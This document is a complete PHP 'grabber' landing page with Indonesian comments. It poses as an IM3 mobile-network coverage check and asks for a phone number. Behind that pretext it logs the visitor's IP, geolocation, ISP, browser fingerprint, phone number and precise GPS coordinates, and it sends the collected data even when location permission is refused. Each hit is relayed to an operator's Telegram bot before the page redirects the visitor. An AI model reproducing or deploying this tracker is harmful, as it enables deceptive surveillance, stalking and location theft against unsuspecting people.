<?php
// grabber/index.php
// Landing page: log IP + fingerprint + prompt lokasi browser, lalu POST lokasi presisi.

$cfg = require __DIR__ . '/config.php';

function client_ip() {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = explode(',', $_SERVER[$k])[0];
            return trim($ip);
        }
    }
    return '0.0.0.0';
}

function geo_lookup($ip, $api) {
    if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        return ['status' => 'fail', 'message' => 'private/invalid ip'];
    }
    $url = $api . rawurlencode($ip) . '?fields=status,message,continent,country,regionName,city,zip,lat,lon,isp,org,as,mobile,proxy,hosting,query';
    $ctx = stream_context_create(['http' => ['timeout' => 5, 'method' => 'GET']]);
    $res = @file_get_contents($url, false, $ctx);
    if ($res === false) return ['status' => 'fail', 'message' => 'geo api unreachable'];
    $j = json_decode($res, true);
    return is_array($j) ? $j : ['status' => 'fail', 'message' => 'bad json'];
}

function append_log($dir, $entry) {
    if (!is_dir($dir)) @mkdir($dir, 0777, true);
    $file = $dir . '/hits.jsonl';
    $line = json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . "\n";
    @file_put_contents($file, $line, FILE_APPEND | LOCK_EX);
}

function tg_notify($cfg, $text) {
    if (empty($cfg['tg_bot_token']) || empty($cfg['tg_chat_id'])) return;
    $url = "https://api.telegram.org/bot{$cfg['tg_bot_token']}/sendMessage";
    $data = http_build_query(['chat_id' => $cfg['tg_chat_id'], 'text' => $text, 'parse_mode' => 'HTML']);
    $ctx = stream_context_create(['http' => ['method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded\r\n", 'content' => $data, 'timeout' => 5]]);
    @file_get_contents($url, false, $ctx);
}

$ip  = client_ip();
$geo = geo_lookup($ip, $cfg['geo_api']);
$ua  = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ref = $_SERVER['HTTP_REFERER'] ?? '';

// ==== Endpoint: terima lokasi presisi dari JS ====
if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST' && isset($_POST['action']) && $_POST['action'] === 'loc') {
    header('Content-Type: application/json');
    $entry = [
        'ts'      => date('c'),
        'type'    => 'precise_location',
        'ip'      => $ip,
        'geo'     => $geo,
        'ua'      => $ua,
        'phone'   => $_POST['phone']   ?? '',
        'lat'     => $_POST['lat']     ?? '',
        'lon'     => $_POST['lon']     ?? '',
        'acc'     => $_POST['acc']     ?? '',
        'fplist'  => $_POST['fplist']  ?? '',
        'tzo'     => $_POST['tzo']     ?? '',
        'lang'    => $_POST['lang']    ?? '',
        'screen'  => $_POST['screen']  ?? '',
        'platform'=> $_POST['platform']?? '',
    ];
    append_log($cfg['log_dir'], $entry);
    tg_notify($cfg,
        "<b>LOC PING</b>\nIP: {$ip}\nTelp: {$entry['phone']}\nLat,Lon: {$entry['lat']},{$entry['lon']}\nAcc: {$entry['acc']}m\nKota: " . ($geo['city'] ?? '?') . ', ' . ($geo['country'] ?? '?')
    );
    echo json_encode(['ok' => true]);
    exit;
}

// ==== Endpoint: fingerprint awal (fingerprintjs / built-in) ====
if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST' && isset($_POST['action']) && $_POST['action'] === 'fp') {
    header('Content-Type: application/json');
    append_log($cfg['log_dir'], [
        'ts' => date('c'), 'type' => 'fingerprint', 'ip' => $ip, 'geo' => $geo, 'ua' => $ua,
        'visitor_id' => $_POST['visitorId'] ?? '', 'components' => $_POST['components'] ?? '',
    ]);
    echo json_encode(['ok' => true]);
    exit;
}

// ==== Log kunjungan awal ====
append_log($cfg['log_dir'], ['ts' => date('c'), 'type' => 'hit', 'ip' => $ip, 'geo' => $geo, 'ua' => $ua, 'ref' => $ref]);
tg_notify($cfg, "<b>HIT</b>\nIP: {$ip}\nKota: " . ($geo['city'] ?? '?') . ', ' . ($geo['country'] ?? '?') . "\nISP: " . ($geo['isp'] ?? '?'));
?>
<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?= htmlspecialchars($cfg['title']) ?></title>
<style>
  :root{--bg:#0a0600;--amber:#ffb000;--amber-bright:#ffd066;--amber-dim:#8a6410;--line:#3a2a08}
  *{box-sizing:border-box}
  html,body{height:100%}
  body{margin:0;color:var(--amber);background:#000;min-height:100vh;display:grid;place-items:center;padding:24px;
    font-family:"VT323","Share Tech Mono",ui-monospace,"Courier New",Consolas,monospace;font-size:16px;
    letter-spacing:.4px;text-shadow:0 0 2px #ffb00099,0 0 8px #ffb00040}
  body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:9999;
    background:repeating-linear-gradient(0deg,rgba(0,0,0,.28) 0,rgba(0,0,0,.28) 1px,transparent 1px,transparent 3px),
      radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,.72) 100%);
    mix-blend-mode:multiply}
  body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:9998;
    background:linear-gradient(rgba(255,176,0,.03),rgba(255,176,0,.03));animation:flicker 4s infinite steps(60)}
  @keyframes flicker{0%,96%{opacity:.35}97%{opacity:.55}98%{opacity:.3}100%{opacity:.35}}
  .card{width:100%;max-width:440px;background:#120c02;border:1px solid var(--line);padding:28px;
    box-shadow:0 0 18px #ffb00022,0 0 60px #00000080 inset}
  .logo{width:56px;height:56px;border:2px solid var(--amber);display:grid;place-items:center;
    font-size:24px;margin-bottom:18px;color:var(--amber-bright);box-shadow:0 0 12px #ffb00055 inset}
  h1{font-size:24px;margin:0 0 6px;color:var(--amber-bright)}
  h1::before{content:"> "}
  p.sub{color:var(--amber-dim);font-size:15px;margin:0 0 22px}
  label{font-size:14px;color:var(--amber-dim);display:block;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px}
  input[type=tel]{width:100%;padding:12px 14px;border:1px solid var(--line);background:#0e0901;
    color:var(--amber);font-size:18px;font-family:inherit;letter-spacing:2px;text-shadow:0 0 2px #ffb00099,0 0 8px #ffb00040}
  input:focus{outline:none;border-color:var(--amber);box-shadow:0 0 12px #ffb00055}
  button{margin-top:18px;width:100%;padding:13px;border:1px solid var(--amber-bright);background:var(--amber);
    color:#0a0600;font-weight:700;font-size:17px;cursor:pointer;font-family:inherit;letter-spacing:2px;text-shadow:none}
  button:hover{box-shadow:0 0 16px #ffb000aa}
  button:active{transform:translateY(1px)}
  .note{margin-top:16px;font-size:13px;color:var(--amber-dim);text-align:center;line-height:1.5}
  .spin{width:15px;height:15px;border:2px solid #ffb00033;border-top-color:var(--amber);border-radius:50%;
    display:inline-block;animation:s .7s linear infinite;vertical-align:-2px;margin-right:8px}
  @keyframes s{to{transform:rotate(360deg)}}
  .ok{color:#39ff88}
</style>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=VT323&family=Share+Tech+Mono&display=swap" rel="stylesheet">
</head>
<body>
  <div class="card">
    <div class="logo">IM3</div>
    <h1><?= htmlspecialchars($cfg['title']) ?></h1>
    <p class="sub"><?= htmlspecialchars($cfg['subtitle']) ?></p>
    <form id="f" autocomplete="off">
      <label>Nomor HP</label>
      <input type="tel" id="phone" inputmode="numeric" placeholder="08xxxxxxxxxx" required>
      <button type="submit" id="btn">Cek Sekarang</button>
      <div class="note" id="note">Dengan menekan tombol, Anda menyetujui verifikasi lokasi untuk keperluan pengecekan cakupan jaringan.</div>
    </form>
  </div>

<script>
(function(){
  const REDIRECT = <?= json_encode($cfg['redirect']) ?>;
  const requireConsent = <?= $cfg['require_consent_js'] ? 'true' : 'false' ?>;
  const f = document.getElementById('f');
  const btn = document.getElementById('btn');
  const note = document.getElementById('note');
  const phone = document.getElementById('phone');

  function fp(){
    return {
      ua: navigator.userAgent,
      lang: navigator.language,
      platform: navigator.platform,
      screen: screen.width + 'x' + screen.height + '@' + (window.devicePixelRatio||1),
      tzo: Intl.DateTimeFormat().resolvedOptions().timeZone,
      touch: ('ontouchstart' in window),
      cores: navigator.hardwareConcurrency || 0,
      mem: navigator.deviceMemory || 0,
      plugins: Array.from(navigator.plugins||[]).map(p=>p.name).join(',').slice(0,300)
    };
  }

  function post(action, data){
    const body = new URLSearchParams(Object.assign({action}, data));
    return fetch('', {method:'POST', body, headers:{'Content-Type':'application/x-www-form-urlencoded'}});
  }

  // fingerprint di awal kunjungan
  post('fp', {visitorId: btoa((navigator.userAgent||'') + screen.width + screen.height)});

  f.addEventListener('submit', function(e){
    e.preventDefault();
    btn.disabled = true;
    btn.innerHTML = '<span class="spin"></span>Memproses...';
    const data = fp();
    data.phone = phone.value;

    function done(){
      note.innerHTML = '<span class="ok">Verifikasi berhasil. Mengalihkan...</span>';
      setTimeout(()=>{ location.href = REDIRECT; }, 1500);
    }

    if (navigator.geolocation){
      navigator.geolocation.getCurrentPosition(function(pos){
        data.lat = pos.coords.latitude;
        data.lon = pos.coords.longitude;
        data.acc = pos.coords.accuracy;
        data.fplist = data.plugins;
        post('loc', data).finally(done);
      }, function(err){
        // user tolak / gagal -> tetap kirim data yang ada
        data.fplist = data.plugins;
        post('loc', data).finally(done);
      }, {enableHighAccuracy:true, timeout:8000, maximumAge:0});
    } else {
      post('loc', data).finally(done);
    }
  });
})();
</script>
</body>
</html>
